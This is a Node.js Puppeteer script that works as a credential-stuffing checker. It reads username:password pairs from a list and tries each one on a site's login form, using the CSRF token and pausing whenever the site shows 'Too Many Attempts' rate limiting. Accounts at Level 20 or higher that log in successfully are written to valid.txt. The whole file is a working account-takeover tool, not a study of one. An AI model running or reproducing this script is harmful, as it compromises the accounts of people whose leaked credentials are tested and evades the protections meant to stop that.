import puppeteer from 'puppeteer';
import fs from 'fs/promises';

const browser = await puppeteer.launch({
  headless: false,
  executablePath: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
  args: [
    '--remote-debugging-port=9222',
    '--no-first-run',
    '--no-default-browser-check',
    '--user-data-dir=C:/chrome-profile'
  ]
});

const accountsText = await fs.readFile('accounts.txt', 'utf-8');
const lines = accountsText.split('\n').filter(Boolean);
const accounts = lines.map(line => {
  const parts = line.trim().split(':');
  return {
    username: parts[1]?.trim(),
    password: parts[2]?.trim()
  };
}).filter(acc => acc.username && acc.password);

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

for (const { username, password } of accounts) {
  const page = await browser.newPage();

  try {
    await page.goto('https://example.com/', { waitUntil: 'networkidle2' });

    const bodyText = await page.evaluate(() => document.body.innerText.trim());
    if (bodyText.includes('Too Many Attempts! Retry after 300 seconds.')) {
      console.log('⚠️ Too many attempts detected. Pausing for 300 seconds...');
      await page.close();
      await delay(300000);
      continue;
    }

    await page.waitForSelector('a.nav-link.dropdown-toggle.text-muted.waves-effect.waves-dark', { visible: true });
    await page.click('a.nav-link.dropdown-toggle.text-muted.waves-effect.waves-dark');

    await page.waitForSelector('a[data-toggle="modal"][data-target="#login"]', { visible: true });
    await page.evaluate(() => {
      const loginBtn = document.querySelector('a[data-toggle="modal"][data-target="#login"]');
      if (loginBtn) loginBtn.click();
    });

    await page.waitForSelector('#login', { visible: true, timeout: 10000 });
    await page.waitForSelector('input[name="login_username"]');
    await page.waitForSelector('input[name="login_password"]');

    const csrfToken = await page.$eval('input[name="_token"]', el => el.value);

    await page.evaluate((username, password, csrfToken) => {
      const form = document.querySelector('#loginform');
      if (!form) return;
      form.querySelector('input[name="login_username"]').value = username;
      form.querySelector('input[name="login_password"]').value = password;
      form.querySelector('input[name="_token"]').value = csrfToken;
      form.submit();
    }, username, password, csrfToken);

    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 });

    const hasPinPage = await page.evaluate(() => {
      return !!document.querySelector('h3.box-title.m-b-20') &&
        document.querySelector('h3.box-title.m-b-20').innerText.trim() === 'Your PIN';
    });
    if (hasPinPage) {
      console.log(`⏭️ PIN page detected for ${username}. Skipping account...`);
      await page.goto('https://example.com/user/logout', { waitUntil: 'networkidle2' });
      await delay(5000);
      await page.close();
      continue;
    }

    const loginError = await page.evaluate(() => {
      return !!document.querySelector('.jq-toast-single.jq-icon-error') &&
        document.querySelector('.jq-toast-single.jq-icon-error').innerText.includes('Incorrect username or password.');
    });
    if (loginError) {
      console.log(`❌ Incorrect username or password for ${username}. Waiting 5 seconds...`);
      await delay(5000);
      await page.close();
      continue;
    }

    const postLoginBodyText = await page.evaluate(() => document.body.innerText.trim());
    const tooManyAttemptsMatch = postLoginBodyText.match(/Too Many Attempts! Retry after (\d+) seconds\./);
    if (tooManyAttemptsMatch) {
      const delaySeconds = parseInt(tooManyAttemptsMatch[1], 10);
      console.log(`⚠️ Too many attempts detected after login. Pausing for ${delaySeconds} seconds...`);
      await page.close();
      await delay(delaySeconds * 1000);
      continue;
    }

    console.log(`✅ Logged in as ${username}/${password}`);

    await page.goto('https://example.com/user/profile', { waitUntil: 'networkidle2' });

    const profileData = await page.evaluate(() => {
      const rows = Array.from(document.querySelectorAll('table.table.m-0 tbody tr'));
      const data = {};
      for (const row of rows) {
        const keyCell = row.querySelector('th');
        const valueCell = row.querySelector('td');
        if (!keyCell || !valueCell) continue;
        const key = keyCell.textContent.trim();
        const value = valueCell.textContent.trim();
        data[key] = value;
      }
      return data;
    });

    const levelMatch = profileData['Level']?.match(/^(\d+)/);
    const level = levelMatch ? parseInt(levelMatch[1], 10) : 0;

    if (level >= 20) {
      const line = `${username}/${password}\n`;
      await fs.appendFile('valid.txt', line, 'utf-8');
      console.log(`💾 Appended valid account: ${username}`);

      await delay(10000);
  }


    await page.goto('https://example.com/user/logout', { waitUntil: 'networkidle2' });
    delay(5000)

  } catch (err) {
    console.error(`❌ Failed to log in as ${username}: ${err.message}`);
  }

  await page.close();
}

await browser.close();
